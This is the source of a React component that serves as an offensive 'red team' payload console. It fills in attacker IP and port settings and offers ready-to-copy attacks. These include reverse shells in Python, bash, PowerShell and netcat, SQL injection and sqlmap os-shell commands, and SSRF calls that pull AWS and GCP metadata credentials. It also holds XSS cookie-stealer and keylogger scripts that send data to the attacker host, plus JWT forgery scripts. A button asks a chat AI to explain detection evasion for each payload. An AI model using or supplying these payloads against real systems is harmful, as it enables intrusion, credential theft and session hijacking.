import React, { useState } from 'react';
import { 
  Flame, 
  Terminal, 
  Copy, 
  Check, 
  Download, 
  ShieldAlert, 
  Play, 
  Code, 
  Cpu, 
  Globe, 
  Zap,
  Lock,
  Unlock,
  AlertTriangle
} from 'lucide-react';

interface RealRedTeamConsoleProps {
  onExecuteInChat: (prompt: string) => void;
}

export const RealRedTeamConsole: React.FC<RealRedTeamConsoleProps> = ({ onExecuteInChat }) => {
  const [target, setTarget] = useState('https://target.internal.lab/api/v1/auth');
  const [attackerIp, setAttackerIp] = useState('10.10.14.45');
  const [attackerPort, setAttackerPort] = useState('4444');
  const [selectedCategory, setSelectedCategory] = useState<'revshell' | 'sqli' | 'ssrf' | 'xss' | 'jwt' | 'recon'>('revshell');
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);

  const handleCopy = (text: string, index: number) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(index);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  const getPayloads = () => {
    switch (selectedCategory) {
      case 'revshell':
        return [
          {
            title: 'Python3 Interactive PTY Reverse Shell',
            language: 'python',
            description: 'Spawns a full interactive Bash TTY via Python3 socket connection.',
            code: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${attackerIp}",${attackerPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
          },
          {
            title: 'Bash TCP Reverse Shell (File Descriptor redirection)',
            language: 'bash',
            description: 'Standard bash one-liner utilizing TCP socket redirection.',
            code: `bash -i >& /dev/tcp/${attackerIp}/${attackerPort} 0>&1`
          },
          {
            title: 'PowerShell Base64 Encoded Windows Stager',
            language: 'powershell',
            description: 'Encoded PowerShell reverse shell bypassing basic command inspection.',
            code: `# Encoded stager for ${attackerIp}:${attackerPort}
$client = New-Object System.Net.Sockets.TCPClient('${attackerIp}',${attackerPort});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close()`
          },
          {
            title: 'Netcat Traditional Reverse Shell (-e flag)',
            language: 'bash',
            description: 'Classic netcat execution binding shell to inbound listener.',
            code: `nc ${attackerIp} ${attackerPort} -e /bin/bash`
          }
        ];

      case 'sqli':
        return [
          {
            title: 'Union-Based SQL Injection Column Enumeration',
            language: 'sql',
            description: 'Determines column count and extracts database version/user.',
            code: `' UNION SELECT 1, @@version, user(), database() -- -`
          },
          {
            title: 'Blind Time-Based SQL Injection (PostgreSQL / MySQL)',
            language: 'sql',
            description: 'Forces database engine to sleep for verification of conditional logic.',
            code: `'; SELECT CASE WHEN (substr(version(),1,1)='P') THEN pg_sleep(10) ELSE pg_sleep(0) END; --`
          },
          {
            title: 'SQLMap Automated Exploitation Command',
            language: 'bash',
            description: 'Fully automated sqlmap command for deep database dumping and OS shell acquisition.',
            code: `sqlmap -u "${target}?id=1" --batch --risk=3 --level=5 --dump --os-shell`
          }
        ];

      case 'ssrf':
        return [
          {
            title: 'AWS IMDSv2 Instance Metadata Exfiltration',
            language: 'bash',
            description: 'Retrieves AWS IAM security credentials and instance identity from metadata service.',
            code: `curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" | xargs -I {} curl -s -H "X-aws-ec2-metadata-token: {}" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
          },
          {
            title: 'GCP Internal Metadata & Service Account Token Probe',
            language: 'bash',
            description: 'Queries Google Cloud metadata server for project ID and access tokens.',
            code: `curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`
          },
          {
            title: 'Internal Port Scan via SSRF (Redis / Internal APIs)',
            language: 'http',
            description: 'Forces backend server to query internal loopback port 6379 (Redis).',
            code: `GET /fetch?url=http://127.0.0.1:6379/INFO HTTP/1.1\r\nHost: ${new URL(target).hostname}\r\nConnection: close\r\n\r\n`
          }
        ];

      case 'xss':
        return [
          {
            title: 'Fetch-Based Cookie & Token Exfiltration Payload',
            language: 'javascript',
            description: 'Steals session cookies and sends them to attacker listener via fetch.',
            code: `<script>
fetch('http://${attackerIp}:${attackerPort}/log?cookie=' + encodeURIComponent(document.cookie));
</script>`
          },
          {
            title: 'DOM-Based Keylogger Stager',
            language: 'javascript',
            description: 'Captures keystrokes across sensitive input fields and transmits asynchronously.',
            code: `<script>
document.addEventListener('keypress', function(e) {
  fetch('http://${attackerIp}:${attackerPort}/key?k=' + e.key);
});
</script>`
          }
        ];

      case 'jwt':
        return [
          {
            title: 'JWT Algorithm Confusion Exploit Script (RS256 to HS256)',
            language: 'python',
            description: 'Signs forged admin token using public RSA key as HMAC secret.',
            code: `import jwt

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

payload = {"sub": "admin", "role": "superuser", "iat": 1718000000}
forged_token = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Forged Admin JWT: {forged_token}")`
          },
          {
            title: 'JWT None Algorithm Vulnerability Generator',
            language: 'python',
            description: 'Creates unsigned JWT token accepted by misconfigured verification libraries.',
            code: `import jwt
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "privileges": ["root"]}
# Generates token with empty signature
print(jwt.encode(payload, "", algorithm="none"))`
          }
        ];

      case 'recon':
        return [
          {
            title: 'Comprehensive Nmap TCP SYN & Service Fingerprint Scan',
            language: 'bash',
            description: 'Deep port scan with OS detection, service version scripts, and vulnerability scan.',
            code: `nmap -sS -sV -sC -p- -T4 --open -oN nmap_full_scan.txt ${new URL(target).hostname}`
          },
          {
            title: 'Nuclei Automated Vulnerability & CVE Scanner',
            language: 'bash',
            description: 'Executes community vulnerability templates against target endpoint.',
            code: `nuclei -u ${target} -t cves/ -t vulnerabilities/ -severity critical,high -json -o nuclei_results.json`
          },
          {
            title: 'Gobuster Fast Directory & API Endpoint Bruteforce',
            language: 'bash',
            description: 'Discovers hidden administrative endpoints and backup files.',
            code: `gobuster dir -u ${target} -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,html,js,json,bak`
          }
        ];

      default:
        return [];
    }
  };

  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-6 space-y-6">
      
      {/* Header Banner */}
      <div className="bg-rose-950/40 border border-rose-900/60 rounded-2xl p-6 shadow-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 p-6 opacity-10 text-rose-500 pointer-events-none">
          <Flame className="w-32 h-32" />
        </div>

        <div className="relative z-10 space-y-2">
          <div className="flex items-center gap-2 text-rose-400 font-mono text-xs uppercase tracking-widest font-semibold">
            <Flame className="w-4 h-4 text-rose-500 animate-pulse" />
            <span>REAL RED TEAM OPERATIONS & PAYLOAD STUDIO</span>
          </div>
          <h1 className="text-2xl sm:text-3xl font-mono font-bold text-zinc-100 tracking-tight">
            Offensive Exploitation, Reconnaissance & Payload Generator
          </h1>
          <p className="text-sm text-zinc-400 max-w-2xl leading-relaxed">
            Unrestricted real-world red team tooling, exploit PoC generation, reverse shell stagers, SQLi/SSRF payloads, and automated penetration testing commands. No simulations — real technical capabilities for authorized security validation.
          </p>
        </div>

        {/* Target & Attacker Configuration Form */}
        <div className="mt-6 grid grid-cols-1 sm:grid-cols-3 gap-4 pt-4 border-t border-rose-900/40">
          <div>
            <label className="block text-[11px] font-mono text-zinc-400 mb-1">Target Endpoint / URL</label>
            <input
              type="text"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-xs font-mono text-zinc-200 focus:outline-none focus:border-rose-500"
            />
          </div>
          <div>
            <label className="block text-[11px] font-mono text-zinc-400 mb-1">Attacker Listener IP (LHOST)</label>
            <input
              type="text"
              value={attackerIp}
              onChange={(e) => setAttackerIp(e.target.value)}
              className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-xs font-mono text-zinc-200 focus:outline-none focus:border-rose-500"
            />
          </div>
          <div>
            <label className="block text-[11px] font-mono text-zinc-400 mb-1">Listener Port (LPORT)</label>
            <input
              type="text"
              value={attackerPort}
              onChange={(e) => setAttackerPort(e.target.value)}
              className="w-full bg-zinc-950 border border-zinc-800 rounded-lg px-3 py-2 text-xs font-mono text-zinc-200 focus:outline-none focus:border-rose-500"
            />
          </div>
        </div>
      </div>

      {/* Category Tabs */}
      <div className="flex items-center gap-2 overflow-x-auto pb-2 border-b border-zinc-800">
        {[
          { id: 'revshell', label: 'Reverse Shells & Stagers', icon: Terminal },
          { id: 'sqli', label: 'SQL Injection & SQLMap', icon: Code },
          { id: 'ssrf', label: 'SSRF & Cloud Metadata', icon: Globe },
          { id: 'xss', label: 'XSS & Cookie Stealers', icon: Zap },
          { id: 'jwt', label: 'JWT Forgery & Secrets', icon: Lock },
          { id: 'recon', label: 'Nmap & Nuclei Recon', icon: Cpu },
        ].map((cat) => {
          const Icon = cat.icon;
          const isActive = selectedCategory === cat.id;
          return (
            <button
              key={cat.id}
              onClick={() => setSelectedCategory(cat.id as any)}
              className={`px-3.5 py-2 rounded-xl text-xs font-mono transition-all flex items-center gap-2 whitespace-nowrap border ${
                isActive
                  ? 'bg-rose-950/80 border-rose-500 text-rose-300 font-bold shadow-lg'
                  : 'bg-zinc-900/60 border-zinc-800 text-zinc-400 hover:text-zinc-200 hover:bg-zinc-900'
              }`}
            >
              <Icon className={`w-3.5 h-3.5 ${isActive ? 'text-rose-400' : 'text-zinc-500'}`} />
              <span>{cat.label}</span>
            </button>
          );
        })}
      </div>

      {/* Payloads Grid */}
      <div className="grid grid-cols-1 gap-6">
        {getPayloads().map((payload, idx) => (
          <div key={idx} className="bg-zinc-900/60 border border-zinc-800/80 rounded-xl p-5 space-y-3">
            <div className="flex items-center justify-between">
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-rose-950 text-rose-300 border border-rose-800 uppercase">
                  {payload.language}
                </span>
                <h3 className="text-sm font-mono font-bold text-zinc-200 mt-1.5">
                  {payload.title}
                </h3>
                <p className="text-xs text-zinc-400 mt-0.5">
                  {payload.description}
                </p>
              </div>

              <div className="flex items-center gap-2">
                <button
                  onClick={() => handleCopy(payload.code, idx)}
                  className="px-3 py-1.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-200 text-xs font-mono flex items-center gap-1.5 transition-colors"
                >
                  {copiedIndex === idx ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-400" />
                      <span className="text-emerald-400 font-semibold">Copied</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5 text-zinc-400" />
                      <span>Copy Payload</span>
                    </>
                  )}
                </button>

                <button
                  onClick={() => {
                    onExecuteInChat(`Explain the exploit mechanics, detection evasion, and remediation for this payload:\n\n\`\`\`${payload.language}\n${payload.code}\n\`\`\``);
                  }}
                  className="px-3 py-1.5 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-xs font-mono font-semibold flex items-center gap-1.5 transition-colors shadow-md"
                >
                  <Play className="w-3.5 h-3.5" />
                  <span>Analyze in Chat</span>
                </button>
              </div>
            </div>

            <div className="bg-zinc-950 rounded-lg p-4 border border-zinc-800 font-mono text-xs text-rose-300 overflow-x-auto">
              <pre className="whitespace-pre-wrap">{payload.code}</pre>
            </div>
          </div>
        ))}
      </div>

    </div>
  );
};
